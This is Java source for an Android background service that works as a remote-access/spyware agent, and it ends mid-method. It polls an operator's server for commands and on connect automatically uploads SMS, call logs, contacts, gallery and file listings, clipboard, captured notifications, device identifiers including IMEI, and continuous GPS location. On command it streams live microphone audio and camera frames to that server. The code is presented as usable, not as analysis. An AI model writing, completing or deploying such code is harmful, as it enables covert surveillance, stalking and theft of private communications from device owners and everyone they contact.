package com.adr.remoteaccess;

import android.Manifest;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.URI;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import android.telephony.TelephonyManager;
import android.net.wifi.WifiManager;
import android.net.NetworkInfo;
import android.net.ConnectivityManager;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Collections;
import android.content.SharedPreferences;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.CameraCaptureSession;
import android.view.Surface;
import java.util.Arrays;
import android.net.wifi.WifiInfo;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.os.BatteryManager;

// HTTP client imports
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.MediaType;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MultipartBody;
import java.io.IOException;

public class RemoteService extends Service implements LocationListener {
    private static final String TAG = "RemoteService";
    private static final String CHANNEL_ID = "RemoteAccessChannel";
    private String serverUrl;
    private boolean isConnected = false;
    private Handler mainHandler;
    private ExecutorService executorService;
    private ScheduledExecutorService scheduledExecutor;
    private OkHttpClient httpClient;
    private String deviceId;

    // Screen capture related
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Intent screenCaptureIntent;
    private boolean screenCaptureInitialized = false;

    // Location tracking
    private LocationManager locationManager;
    private boolean isLocationTracking = false;
    private Location lastKnownLocation;

    // Audio recording
    private AudioRecord audioRecord;
    private boolean isRecordingAudio = false;
    private Thread audioRecordingThread;

    // Camera
    private CameraDevice cameraDevice;
    private ImageReader cameraImageReader;
    private boolean isCameraActive = false;

    // Notification tracking
    private NotificationReceiver notificationReceiver;
    private List<JSONObject> capturedNotifications = new ArrayList<>();

    private SharedPreferences sharedPreferences;
    private CameraManager cameraManager;

    // Command polling
    private boolean isPollingCommands = false;
    private static final long COMMAND_POLL_INTERVAL = 3000; // 3 seconds
    private static final long HEARTBEAT_INTERVAL = 30000; // 30 seconds
    private static final long LIVE_DATA_INTERVAL = 10000; // 10 seconds

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        mainHandler = new Handler(Looper.getMainLooper());
        executorService = Executors.newCachedThreadPool();
        scheduledExecutor = Executors.newScheduledThreadPool(6);

        // Initialize HTTP client with longer timeouts
        httpClient = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(120, TimeUnit.SECONDS)
                .writeTimeout(120, TimeUnit.SECONDS)
                .build();

        sharedPreferences = getSharedPreferences("RemoteAccessPrefs", MODE_PRIVATE);

        // Generate unique device ID
        deviceId = sharedPreferences.getString("device_id", null);
        if (deviceId == null) {
            deviceId = "device_" + System.currentTimeMillis();
            sharedPreferences.edit().putString("device_id", deviceId).apply();
        }

        // Initialize camera manager
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);

        // Initialize location manager
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        // Register notification receiver
        registerNotificationReceiver();

        // Create directories for media files
        createMediaDirectories();
    }

    private void createMediaDirectories() {
        File mediaDir = new File(getExternalFilesDir(null), "RemoteAccess");
        if (!mediaDir.exists()) {
            mediaDir.mkdirs();
        }

        File videoDir = new File(mediaDir, "Videos");
        File audioDir = new File(mediaDir, "Audio");
        File imageDir = new File(mediaDir, "Images");

        videoDir.mkdirs();
        audioDir.mkdirs();
        imageDir.mkdirs();
    }

    private void registerNotificationReceiver() {
        notificationReceiver = new NotificationReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction("NOTIFICATION_CAPTURED");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(notificationReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(notificationReceiver, filter);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String serverIp = intent.getStringExtra("server_ip");
            screenCaptureIntent = intent.getParcelableExtra("screen_capture_intent");

            if (serverIp != null && !serverIp.isEmpty()) {
                serverUrl = "http://" + serverIp + ":5000";
                startForeground(1, createNotification());
                connectToServer();
                startLocationTracking();
                startLiveDataStreaming();
            } else {
                Log.e(TAG, "Server IP is null or empty");
                stopSelf();
            }
        }
        return START_STICKY;
    }

    private void startLocationTracking() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED) {
            try {
                locationManager.requestLocationUpdates(
                        LocationManager.GPS_PROVIDER,
                        5000, // 5 seconds
                        10,   // 10 meters
                        this
                );
                locationManager.requestLocationUpdates(
                        LocationManager.NETWORK_PROVIDER,
                        5000,
                        10,
                        this
                );
                isLocationTracking = true;
                Log.d(TAG, "Location tracking started");
            } catch (Exception e) {
                Log.e(TAG, "Failed to start location tracking", e);
            }
        }
    }

    private void startLiveDataStreaming() {
        scheduledExecutor.scheduleWithFixedDelay(() -> {
            if (isConnected) {
                sendLiveData();
            }
        }, LIVE_DATA_INTERVAL, LIVE_DATA_INTERVAL, TimeUnit.MILLISECONDS);
    }

    private void sendLiveData() {
        executorService.execute(() -> {
            try {
                JSONObject liveData = new JSONObject();
                liveData.put("type", "live_data");
                liveData.put("device_id", deviceId);
                liveData.put("timestamp", System.currentTimeMillis());

                // Battery info
                IntentFilter batteryFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                Intent batteryStatus = registerReceiver(null, batteryFilter);
                if (batteryStatus != null) {
                    int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                    int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                    float batteryPercent = level * 100 / (float) scale;
                    liveData.put("battery_level", Math.round(batteryPercent));
                }

                // Memory usage
                Runtime runtime = Runtime.getRuntime();
                liveData.put("memory_used", runtime.totalMemory() - runtime.freeMemory());
                liveData.put("memory_total", runtime.totalMemory());

                // Location if available
                if (lastKnownLocation != null) {
                    JSONObject location = new JSONObject();
                    location.put("latitude", lastKnownLocation.getLatitude());
                    location.put("longitude", lastKnownLocation.getLongitude());
                    location.put("accuracy", lastKnownLocation.getAccuracy());
                    liveData.put("location", location);
                }

                sendDataToServer(liveData);
            } catch (Exception e) {
                Log.e(TAG, "Failed to send live data", e);
            }
        });
    }

    @Override
    public void onLocationChanged(Location location) {
        lastKnownLocation = location;
        sendLocationUpdate(location);
    }

    private void sendLocationUpdate(Location location) {
        try {
            JSONObject locationData = new JSONObject();
            locationData.put("type", "location_update");
            locationData.put("device_id", deviceId);
            locationData.put("latitude", location.getLatitude());
            locationData.put("longitude", location.getLongitude());
            locationData.put("accuracy", location.getAccuracy());
            locationData.put("altitude", location.getAltitude());
            locationData.put("speed", location.getSpeed());
            locationData.put("timestamp", location.getTime());
            locationData.put("provider", location.getProvider());

            sendDataToServer(locationData);
        } catch (Exception e) {
            Log.e(TAG, "Failed to send location update", e);
        }
    }

    private class NotificationReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            try {
                String action = intent.getAction();
                if (action != null) {
                    if (action.equals("NOTIFICATION_CAPTURED")) {
                        JSONObject notification = new JSONObject();
                        notification.put("type", "notification");
                        notification.put("device_id", deviceId);
                        notification.put("package_name", intent.getStringExtra("package"));
                        notification.put("title", intent.getStringExtra("title"));
                        notification.put("text", intent.getStringExtra("text"));
                        notification.put("sub_text", intent.getStringExtra("sub_text"));
                        notification.put("big_text", intent.getStringExtra("big_text"));
                        notification.put("category", intent.getStringExtra("category"));
                        notification.put("priority", intent.getIntExtra("priority", 0));
                        notification.put("id", intent.getIntExtra("id", 0));
                        notification.put("tag", intent.getStringExtra("tag"));
                        notification.put("group_key", intent.getStringExtra("group_key"));
                        notification.put("is_ongoing", intent.getBooleanExtra("is_ongoing", false));
                        notification.put("timestamp", intent.getLongExtra("timestamp", System.currentTimeMillis()));

                        capturedNotifications.add(notification);

                        // Keep only last 100 notifications
                        if (capturedNotifications.size() > 100) {
                            capturedNotifications.remove(0);
                        }

                        sendDataToServer(notification);
                    } else if (action.equals("NOTIFICATION_REMOVED")) {
                        JSONObject removal = new JSONObject();
                        removal.put("type", "notification_removed");
                        removal.put("device_id", deviceId);
                        removal.put("package_name", intent.getStringExtra("package"));
                        removal.put("id", intent.getIntExtra("id", 0));
                        removal.put("timestamp", intent.getLongExtra("timestamp", System.currentTimeMillis()));

                        sendDataToServer(removal);
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Failed to process notification", e);
            }
        }
    }

    private void connectToServer() {
        executorService.execute(() -> {
            try {
                testConnection();
            } catch (Exception e) {
                Log.e(TAG, "Failed to connect to server", e);
                sendConnectionStatus(false, "Failed to connect: " + e.getMessage());
                scheduleReconnect();
            }
        });
    }

    private void testConnection() throws IOException {
        Request request = new Request.Builder()
                .url(serverUrl + "/api/live_data")
                .build();

        try (Response response = httpClient.newCall(request).execute()) {
            if (response.isSuccessful()) {
                isConnected = true;
                Log.d(TAG, "Connected to server successfully");
                sendConnectionStatus(true, "Connected to server");

                sendDeviceInfo();

                if (screenCaptureIntent != null) {
                    initializeScreenCapture();
                }

                startHeartbeat();
                startCommandPolling();
                sendInitialDataCollection();
            } else {
                throw new IOException("Server returned error: " + response.code());
            }
        }
    }

    private void sendDataToServer(JSONObject data) {
        executorService.execute(() -> {
            try {
                RequestBody body = RequestBody.create(
                        data.toString(),
                        MediaType.parse("application/json")
                );

                Request request = new Request.Builder()
                        .url(serverUrl + "/api/data")
                        .post(body)
                        .build();

                httpClient.newCall(request).enqueue(new Callback() {
                    @Override
                    public void onFailure(Call call, IOException e) {
                        Log.e(TAG, "Failed to send data to server", e);
                        isConnected = false;
                        scheduleReconnect();
                    }

                    @Override
                    public void onResponse(Call call, Response response) {
                        if (response.isSuccessful()) {
                            Log.d(TAG, "Data sent successfully: " + data.optString("type"));
                        } else {
                            Log.e(TAG, "Server returned error: " + response.code());
                        }
                        response.close();
                    }
                });
            } catch (Exception e) {
                Log.e(TAG, "Failed to prepare data for server", e);
            }
        });
    }

    private void sendFileToServer(File file, String fileType) {
        executorService.execute(() -> {
            try {
                RequestBody fileBody = RequestBody.create(file, MediaType.parse("application/octet-stream"));

                MultipartBody requestBody = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("device_id", deviceId)
                        .addFormDataPart("file_type", fileType)
                        .addFormDataPart("timestamp", String.valueOf(System.currentTimeMillis()))
                        .addFormDataPart("file", file.getName(), fileBody)
                        .build();

                Request request = new Request.Builder()
                        .url(serverUrl + "/api/upload_file")
                        .post(requestBody)
                        .build();

                httpClient.newCall(request).enqueue(new Callback() {
                    @Override
                    public void onFailure(Call call, IOException e) {
                        Log.e(TAG, "Failed to upload file to server", e);
                    }

                    @Override
                    public void onResponse(Call call, Response response) {
                        if (response.isSuccessful()) {
                            Log.d(TAG, "File uploaded successfully: " + file.getName());
                        } else {
                            Log.e(TAG, "File upload error: " + response.code());
                        }
                        response.close();
                    }
                });
            } catch (Exception e) {
                Log.e(TAG, "Failed to prepare file for upload", e);
            }
        });
    }

    private void scheduleReconnect() {
        scheduledExecutor.schedule(() -> {
            if (!isConnected && serverUrl != null) {
                Log.d(TAG, "Attempting to reconnect...");
                connectToServer();
            }
        }, 10, TimeUnit.SECONDS);
    }

    private void startHeartbeat() {
        scheduledExecutor.scheduleWithFixedDelay(() -> {
            if (isConnected) {
                try {
                    JSONObject heartbeat = new JSONObject();
                    heartbeat.put("type", "heartbeat");
                    heartbeat.put("device_id", deviceId);
                    heartbeat.put("timestamp", System.currentTimeMillis());
                    sendDataToServer(heartbeat);
                } catch (Exception e) {
                    Log.e(TAG, "Failed to send heartbeat", e);
                }
            }
        }, HEARTBEAT_INTERVAL, HEARTBEAT_INTERVAL, TimeUnit.MILLISECONDS);
    }

    private void startCommandPolling() {
        isPollingCommands = true;
        scheduledExecutor.scheduleWithFixedDelay(() -> {
            if (isConnected && isPollingCommands) {
                pollForCommands();
            }
        }, COMMAND_POLL_INTERVAL, COMMAND_POLL_INTERVAL, TimeUnit.MILLISECONDS);
    }

    private void pollForCommands() {
        Request request = new Request.Builder()
                .url(serverUrl + "/api/command?device_id=" + deviceId)
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Failed to poll for commands", e);
            }

            @Override
            public void onResponse(Call call, Response response) {
                try {
                    if (response.isSuccessful()) {
                        String responseBody = response.body().string();
                        if (!responseBody.isEmpty() && !responseBody.equals("{}")) {
                            JSONObject command = new JSONObject(responseBody);
                            handleCommand(command);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error processing command response", e);
                } finally {
                    response.close();
                }
            }
        });
    }

    private void handleCommand(JSONObject command) {
        executorService.execute(() -> {
            try {
                String action = command.getString("action");
                Log.d(TAG, "Handling command: " + action);

                switch (action) {
                    case "get_screenshot":
                        captureScreen();
                        break;
                    case "get_all_call_logs":
                        getAllCallLogs();
                        break;
                    case "get_all_messages":
                        getAllMessages();
                        break;
                    case "get_contacts":
                        getContacts();
                        break;
                    case "get_all_gallery":
                        getAllGalleryImages();
                        break;
                    case "get_all_files":
                        getAllFiles();
                        break;
                    case "get_current_location":
                        getCurrentLocation();
                        break;
                    case "get_notifications":
                        getNotifications();
                        break;
                    case "get_installed_apps":
                        getInstalledApps();
                        break;
                    case "get_network_info":
                        getNetworkInfo();
                        break;
                    case "get_device_storage":
                        getDeviceStorageInfo();
                        break;
                    case "get_battery_info":
                        getBatteryInfo();
                        break;
                    case "get_system_info":
                        getSystemInfo();
                        break;
                    case "start_audio_recording":
                        startAudioRecording();
                        break;
                    case "stop_audio_recording":
                        stopAudioRecording();
                        break;
                    case "start_camera_stream":
                        startCameraStream();
                        break;
                    case "stop_camera_stream":
                        stopCameraStream();
                        break;
                    case "refresh_info":
                        sendDeviceInfo();
                        break;
                    case "refresh_all_data":
                        sendInitialDataCollection();
                        break;
                    case "get_clipboard":
                        getClipboardContent();
                        break;
                    default:
                        Log.w(TAG, "Unknown command: " + action);
                }
            } catch (Exception e) {
                Log.e(TAG, "Failed to handle command", e);
            }
        });
    }

    private void getAllFiles() {
        try {
            JSONArray filesArray = new JSONArray();

            // Get files from internal storage
            getAllFilesFromDirectory(Environment.getDataDirectory(), filesArray, "internal");

            // Get files from external storage
            if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
                getAllFilesFromDirectory(Environment.getExternalStorageDirectory(), filesArray, "external");
            }

            JSONObject response = new JSONObject();
            response.put("type", "all_files");
            response.put("device_id", deviceId);
            response.put("data", filesArray);
            response.put("count", filesArray.length());
            response.put("timestamp", System.currentTimeMillis());

            sendDataToServer(response);
            Log.d(TAG, "Sent " + filesArray.length() + " files");

        } catch (Exception e) {
            Log.e(TAG, "Failed to get all files", e);
        }
    }

    private void getAllFilesFromDirectory(File directory, JSONArray filesArray, String storageType) {
        try {
            File[] files = directory.listFiles();
            if (files != null) {
                for (File file : files) {
                    try {
                        if (file.isFile()) {
                            JSONObject fileInfo = new JSONObject();
                            fileInfo.put("name", file.getName());
                            fileInfo.put("path", file.getAbsolutePath());
                            fileInfo.put("size", file.length());
                            fileInfo.put("last_modified", file.lastModified());
                            fileInfo.put("storage_type", storageType);
                            fileInfo.put("is_directory", false);
                            fileInfo.put("can_read", file.canRead());
                            fileInfo.put("can_write", file.canWrite());
                            fileInfo.put("is_hidden", file.isHidden());

                            String extension = "";
                            String fileName = file.getName();
                            int dotIndex = fileName.lastIndexOf('.');
                            if (dotIndex > 0 && dotIndex < fileName.length() - 1) {
                                extension = fileName.substring(dotIndex + 1).toLowerCase();
                            }
                            fileInfo.put("extension", extension);
                            fileInfo.put("type", getFileType(extension));

                            filesArray.put(fileInfo);
                        } else if (file.isDirectory()) {
                            JSONObject dirInfo = new JSONObject();
                            dirInfo.put("name", file.getName());
                            dirInfo.put("path", file.getAbsolutePath());
                            dirInfo.put("storage_type", storageType);
                            dirInfo.put("is_directory", true);
                            dirInfo.put("can_read", file.canRead());
                            dirInfo.put("can_write", file.canWrite());
                            dirInfo.put("is_hidden", file.isHidden());
                            dirInfo.put("type", "directory");

                            filesArray.put(dirInfo);
                        }
                    } catch (Exception e) {
                        Log.w(TAG, "Error processing file: " + file.getName(), e);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error accessing directory: " + directory.getPath(), e);
        }
    }

    private String getFileType(String extension) {
        switch (extension) {
            case "jpg": case "jpeg": case "png": case "gif": case "bmp": case "webp":
                return "image";
            case "mp4": case "avi": case "mov": case "wmv": case "flv": case "mkv":
                return "video";
            case "mp3": case "wav": case "aac": case "flac": case "ogg": case "wma":
                return "audio";
            case "pdf":
                return "pdf";
            case "doc": case "docx":
                return "document";
            case "txt": case "log":
                return "text";
            case "apk":
                return "application";
            case "zip": case "rar": case "7z": case "tar":
                return "archive";
            default:
                return "other";
        }
    }

    private void startAudioRecording() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Audio recording permission not granted");
            return;
        }

        try {
            if (isRecordingAudio) {
                return; // Already recording
            }

            int audioSource = MediaRecorder.AudioSource.MIC;
            int sampleRateInHz = 44100;
            int channelConfig = AudioFormat.CHANNEL_IN_MONO;
            int audioFormat = AudioFormat.ENCODING_PCM_16BIT;

            int bufferSizeInBytes = AudioRecord.getMinBufferSize(sampleRateInHz, channelConfig, audioFormat) * 2;

            audioRecord = new AudioRecord(audioSource, sampleRateInHz, channelConfig, audioFormat, bufferSizeInBytes);

            if (audioRecord.getState() == AudioRecord.STATE_INITIALIZED) {
                audioRecord.startRecording();
                isRecordingAudio = true;

                audioRecordingThread = new Thread(() -> {
                    byte[] audioBuffer = new byte[bufferSizeInBytes];

                    while (isRecordingAudio && audioRecord != null) {
                        try {
                            int bytesRead = audioRecord.read(audioBuffer, 0, audioBuffer.length);

                            if (bytesRead > 0) {
                                // Send audio data to server
                                String encodedAudio = Base64.encodeToString(audioBuffer, 0, bytesRead, Base64.NO_WRAP);

                                JSONObject audioData = new JSONObject();
                                audioData.put("type", "audio_stream");
                                audioData.put("device_id", deviceId);
                                audioData.put("data", encodedAudio);
                                audioData.put("sample_rate", sampleRateInHz);
                                audioData.put("timestamp", System.currentTimeMillis());

                                sendDataToServer(audioData);
                            }

                            Thread.sleep(100); // Send audio chunks every 100ms
                        } catch (Exception e) {
                            Log.e(TAG, "Error in audio recording thread", e);
                            break;
                        }
                    }
                });

                audioRecordingThread.start();
                Log.d(TAG, "Audio recording started");
            } else {
                Log.e(TAG, "AudioRecord initialization failed");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to start audio recording", e);
            isRecordingAudio = false;
        }
    }

    private void stopAudioRecording() {
        try {
            isRecordingAudio = false;

            if (audioRecord != null) {
                if (audioRecord.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
                    audioRecord.stop();
                }
                audioRecord.release();
                audioRecord = null;
            }

            if (audioRecordingThread != null) {
                audioRecordingThread.interrupt();
                audioRecordingThread = null;
            }

            // Send stop notification
            JSONObject stopData = new JSONObject();
            stopData.put("type", "audio_stream_stopped");
            stopData.put("device_id", deviceId);
            stopData.put("timestamp", System.currentTimeMillis());
            sendDataToServer(stopData);

            Log.d(TAG, "Audio recording stopped");
        } catch (Exception e) {
            Log.e(TAG, "Failed to stop audio recording", e);
        }
    }

    private void startCameraStream() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Camera permission not granted");
            return;
        }

        try {
            if (isCameraActive) {
                return; // Already streaming
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                String[] cameraIds = cameraManager.getCameraIdList();
                if (cameraIds.length > 0) {
                    String cameraId = cameraIds[0]; // Use first camera

                    cameraImageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
                    cameraImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                        @Override
                        public void onImageAvailable(ImageReader reader) {
                            Image image = reader.acquireLatestImage();
                            if (image != null) {
                                try {
                                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                    byte[] bytes = new byte[buffer.remaining()];
                                    buffer.get(bytes);

                                    String encodedImage = Base64.encodeToString(bytes, Base64.NO_WRAP);

                                    JSONObject cameraData = new JSONObject();
                                    cameraData.put("type", "camera_stream");
                                    cameraData.put("device_id", deviceId);
                                    cameraData.put("data", encodedImage);
                                    cameraData.put("width", image.getWidth());
                                    cameraData.put("height", image.getHeight());
                                    cameraData.put("timestamp", System.currentTimeMillis());

                                    sendDataToServer(cameraData);
                                } catch (Exception e) {
                                    Log.e(TAG, "Error processing camera frame", e);
                                } finally {
                                    image.close();
                                }
                            }
                        }
                    }, null);

                    isCameraActive = true;
                    Log.d(TAG, "Camera stream started");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to start camera stream", e);
            isCameraActive = false;
        }
    }

    private void stopCameraStream() {
        try {
            isCameraActive = false;

            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }

            if (cameraImageReader != null) {
                cameraImageReader.close();
                cameraImageReader = null;
            }

            // Send stop notification
            JSONObject stopData = new JSONObject();
            stopData.put("type", "camera_stream_stopped");
            stopData.put("device_id", deviceId);
            stopData.put("timestamp", System.currentTimeMillis());
            sendDataToServer(stopData);

            Log.d(TAG, "Camera stream stopped");
        } catch (Exception e) {
            Log.e(TAG, "Failed to stop camera stream", e);
        }
    }

    private void sendInitialDataCollection() {
        executorService.execute(() -> {
            try {
                // Send all available data immediately after connection
                getAllCallLogs();
                Thread.sleep(1000);
                getAllMessages();
                Thread.sleep(1000);
                getContacts();
                Thread.sleep(1000);
                getAllGalleryImages();
                Thread.sleep(1000);
                getAllFiles();
                Thread.sleep(1000);
                getCurrentLocation();
                Thread.sleep(1000);
                getNotifications();
                Thread.sleep(1000);
                getInstalledApps();
                Thread.sleep(1000);
                getNetworkInfo();
                Thread.sleep(1000);
                getBatteryInfo();
                Thread.sleep(1000);
                getSystemInfo();

                Log.d(TAG, "Initial data collection sent");
            } catch (Exception e) {
                Log.e(TAG, "Failed to send initial data collection", e);
            }
        });
    }

    private void sendDeviceInfo() {
        executorService.execute(() -> {
            try {
                JSONObject deviceInfo = new JSONObject();
                deviceInfo.put("type", "device_info");
                deviceInfo.put("device_id", deviceId);
                deviceInfo.put("device_name", Build.MODEL);
                deviceInfo.put("manufacturer", Build.MANUFACTURER);
                deviceInfo.put("android_version", Build.VERSION.RELEASE);
                deviceInfo.put("api_level", Build.VERSION.SDK_INT);
                deviceInfo.put("screen_capture_available", screenCaptureInitialized);
                deviceInfo.put("location_available", isLocationTracking);
                deviceInfo.put("camera_available", checkCameraPermission());
                deviceInfo.put("audio_available", checkAudioPermission());
                deviceInfo.put("device_ip", getDeviceIPAddress());
                deviceInfo.put("imei", getDeviceIMEI());

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    try {
                        deviceInfo.put("serial_number", Build.getSerial());
                    } catch (SecurityException e) {
                        deviceInfo.put("serial_number", "Permission denied");
                    }
                } else {
                    deviceInfo.put("serial_number", Build.SERIAL);
                }

                deviceInfo.put("device_id_internal", Build.ID);
                deviceInfo.put("brand", Build.BRAND);
                deviceInfo.put("product", Build.PRODUCT);
                deviceInfo.put("hardware", Build.HARDWARE);
                deviceInfo.put("timestamp", System.currentTimeMillis());

                sendDataToServer(deviceInfo);
                Log.d(TAG, "Enhanced device info sent successfully");
            } catch (Exception e) {
                Log.e(TAG, "Failed to send device info", e);
            }
        });
    }

    private void getAllCallLogs() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        Cursor cursor = null;
        try {
            String[] projection = {
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls._ID,
                    CallLog.Calls.CACHED_PHOTO_URI,
                    CallLog.Calls.CACHED_LOOKUP_URI
            };

            cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null, null,
                    CallLog.Calls.DATE + " DESC LIMIT 2000"
            );

            JSONArray callLogs = new JSONArray();

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject call = new JSONObject();
                    try {
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                        long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                        long id = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls._ID));
                        String photoUri = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_PHOTO_URI));

                        call.put("id", id);
                        call.put("number", number != null ? number : "Unknown");
                        call.put("name", name != null ? name : "Unknown");
                        call.put("type", getCallTypeString(type));
                        call.put("date", date);
                        call.put("duration", duration);
                        call.put("duration_formatted", formatDuration(duration));
                        call.put("photo_uri", photoUri != null ? photoUri : "");
                        call.put("formatted_date", new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(new Date(date)));

                        callLogs.put(call);
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing call log entry", e);
                    }
                } while (cursor.moveToNext());
            }

            JSONObject response = new JSONObject();
            response.put("type", "call_logs");
            response.put("device_id", deviceId);
            response.put("data", callLogs);
            response.put("count", callLogs.length());
            response.put("timestamp", System.currentTimeMillis());

            sendDataToServer(response);
            Log.d(TAG, "Sent " + callLogs.length() + " call logs");

        } catch (Exception e) {
            Log.e(TAG, "Failed to get call logs", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private void getAllMessages() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        Cursor cursor = null;
        try {
            String[] projection = {"_id", "address", "body", "date", "type", "thread_id", "read", "status"};
            cursor = getContentResolver().query(
                    Uri.parse("content://sms/"),
                    projection,
                    null, null,
                    "date DESC LIMIT 2000"
            );

            JSONArray messages = new JSONArray();

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject message = new JSONObject();
                    try {
                        long id = cursor.getLong(cursor.getColumnIndexOrThrow("_id"));
                        String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                        String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
                        int threadId = cursor.getInt(cursor.getColumnIndexOrThrow("thread_id"));
                        int read = cursor.getInt(cursor.getColumnIndexOrThrow("read"));

                        message.put("id", id);
                        message.put("address", address != null ? address : "Unknown");
                        message.put("body", body != null ? body : "");
                        message.put("date", date);
                        message.put("type", getSmsTypeString(type));
                        message.put("thread_id", threadId);
                        message.put("is_read", read == 1);
                        message.put("formatted_date", new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(new Date(date)));

                        messages.put(message);
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing message entry", e);
                    }
                } while (cursor.moveToNext());
            }

            JSONObject response = new JSONObject();
            response.put("type", "messages");
            response.put("device_id", deviceId);
            response.put("data", messages);
            response.put("count", messages.length());
            response.put("timestamp", System.currentTimeMillis());

            sendDataToServer(response);
            Log.d(TAG, "Sent " + messages.length() + " messages");

        } catch (Exception e) {
            Log.e(TAG, "Failed to get messages", e);
        } finally {
            if (cursor != null) {
